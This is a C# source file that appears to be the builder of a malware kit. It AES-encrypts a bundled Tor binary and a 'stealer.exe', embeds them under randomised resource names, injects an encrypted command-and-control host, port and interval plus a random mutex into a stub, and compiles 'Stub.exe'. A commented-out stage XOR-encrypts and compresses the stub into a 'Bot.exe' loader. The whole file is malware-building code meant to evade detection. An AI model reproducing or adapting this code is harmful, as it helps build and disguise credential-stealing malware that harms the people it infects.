using System;
using System.Collections.Generic;
using System.Text;
using System.IO;

using Builder.Core;
using Builder.Core.Compiler;
using System.Windows.Forms;
using Builder.Utilities;
using System.Resources;
using Builder.Security;

namespace Builder.Core.Builder
{
    class CBuilder
    {
        public delegate void delOnLog(String strMessage);
        public event delOnLog OnLog;
        private String m_strHost, m_strPort;
        private Int32 m_iInterval;
        private Boolean m_bIsDebug = false;

        public CBuilder(String strHost, String strPort, Int32 iInterval, Boolean bIsDebug)
        {
            if (String.IsNullOrEmpty(strHost))
            {
                throw new ArgumentNullException("strHost");
            }


            if (iInterval < 0)
                iInterval = 1;

            m_strHost = strHost;
            m_strPort = strPort;
            m_iInterval = iInterval;
            m_bIsDebug = bIsDebug;
        }

        public bool BuildBin()
        {
            if (!File.Exists("tor.exe"))
            {
                MessageBox.Show("Tor doesnt exist.");
                return false;
            }

            try
            {
                String[] arr_strStub = this.ReadCode("Stub");

                if (arr_strStub == null) return false;

                String strAESKey = CUtils.RandomString(CUtils.RandomInt(12, 24));

                if (OnLog != null) OnLog.Invoke("Compiling Stub...");

                Byte[] arr_bTorBuffer, arr_bStealerBuffer = null;

                //Read Tor structure in-to array.
                arr_bTorBuffer = File.ReadAllBytes("tor.exe");

                CAES AES = new CAES(strAESKey);

                //Encrypt Tor structure
                arr_bTorBuffer = AES.Encrypt(arr_bTorBuffer);

                //Read Stealer structure in-to array
                arr_bStealerBuffer = File.ReadAllBytes("stealer.exe");

                //Encrypt Stealer structure
                arr_bStealerBuffer = AES.Encrypt(arr_bStealerBuffer);

                String strRandResName, strRandTorName, strRandStealerName;

                strRandResName = CUtils.RandomString(CUtils.RandomInt(15, 32));
                strRandTorName = CUtils.RandomString(CUtils.RandomInt(15, 32));
                strRandStealerName = CUtils.RandomString(CUtils.RandomInt(14, 32));

                using (ResourceWriter rwWriter = new ResourceWriter(String.Format("{0}.resources", strRandResName)))
                {
                    rwWriter.AddResource(strRandTorName, arr_bTorBuffer);
                    rwWriter.AddResource(strRandStealerName, arr_bStealerBuffer);
                }

                for (int i = 0; i < arr_strStub.Length; i++)
                {
                    if(arr_strStub[i].Contains("{SETTINGS_HERE}"))
                    {
                        string strSettings = AES.Encrypt(string.Format("{0}|{1}|{2}", m_strHost, m_strPort, m_iInterval));

                        arr_strStub[i] = arr_strStub[i].Replace("{SETTINGS_HERE}", strSettings);

                        arr_strStub[i] = arr_strStub[i].Replace("{AES_KEY_HERE}", strAESKey);

                        arr_strStub[i] = arr_strStub[i].Replace("{RAND_RES_NAME}", strRandResName);
                        arr_strStub[i] = arr_strStub[i].Replace("{RAND_TOR_NAME}", strRandTorName);
                        arr_strStub[i] = arr_strStub[i].Replace("{RAND_STEALER_NAME}", strRandStealerName);
                        arr_strStub[i] = arr_strStub[i].Replace("{MUTEX_HERE}", CUtils.RandomString(16));
                    }

                    /*if (arr_strStub[i].Contains("{HOST_HERE}"))
                    {
                        arr_strStub[i] = arr_strStub[i].Replace("{HOST_HERE}", m_strHost);
                        arr_strStub[i] = arr_strStub[i].Replace("{PAGE_HERE}", m_strPage);
                        arr_strStub[i] = arr_strStub[i].Replace("{INTERVAL_HERE}", m_iInterval.ToString());
                        arr_strStub[i] = arr_strStub[i].Replace("{XOR_KEY}", strXorKey);
                        arr_strStub[i] = arr_strStub[i].Replace("{RAND_RES_NAME}", strRandResName);
                        arr_strStub[i] = arr_strStub[i].Replace("{RAND_TOR_NAME}", strRandTorName);
                        arr_strStub[i] = arr_strStub[i].Replace("{RAND_STEALER_NAME}", strRandStealerName);
                    }*/
                }

                if (CCompiler.CompileFromSource(arr_strStub, "Stub.exe", m_bIsDebug, null, new string[] { String.Format("{0}.resources", strRandResName) }))
                {
                    if (OnLog != null) OnLog.Invoke("Stub compiled.");

                    /*String strPayloadKey = CUtils.RandomString(CUtils.RandomInt(12, 24));

                    byte[] arr_bStub = CUtils.Compress(CUtils.XorCrypt(File.ReadAllBytes("Stub.exe"), strPayloadKey));

                    using (ResourceWriter rwWriter = new ResourceWriter("res.resources"))
                    {
                        rwWriter.AddResource("payload", arr_bStub);
                    }

                    String[] arr_strLoader = this.ReadCode("Loader");

                    for (int i = 0; i < arr_strLoader.Length; i++)
                    {
                        if (arr_strLoader[i].Contains("{XOR_KEY}")) arr_strLoader[i] = arr_strLoader[i].Replace("{XOR_KEY}", strPayloadKey);
                    }

                    //File.Delete("Stub.exe");

                    if (OnLog != null) OnLog.Invoke("Compiling Loader...");
                    if (CCompiler.CompileFromSource(arr_strLoader, "Bot.exe", null, new string[] { "res.resources" }))
                    {
                        if (OnLog != null) OnLog.Invoke("Loader compiled.");
                        return true;
                    }*/
                    return true;
                }
                else
                {
                    if (OnLog != null) OnLog.Invoke("Compilation failed.");
                }
            }
            catch { }
            return false;
        }

        string[] ReadCode(String strName)
        {
            try
            {
                List<String> lstSource = new List<String>();

                if (OnLog != null) OnLog.Invoke(String.Format("Reading {0}...", strName));
                foreach(String strFile in Directory.GetFiles(String.Format(@"Source\{0}", strName), "*.cs", SearchOption.AllDirectories))
                {
                    if (OnLog != null) OnLog.Invoke(String.Format("Reading: {0}", strFile));
                    String strContent = File.ReadAllText(strFile);

                    if (!String.IsNullOrEmpty(strContent))
                    {
                        lstSource.Add(strContent);
                    }
                }
                if (OnLog != null) OnLog.Invoke(String.Format("{0} reading finished.", strName));
                return lstSource.ToArray();
            }
            catch { }
            return null;
        }
    }
}
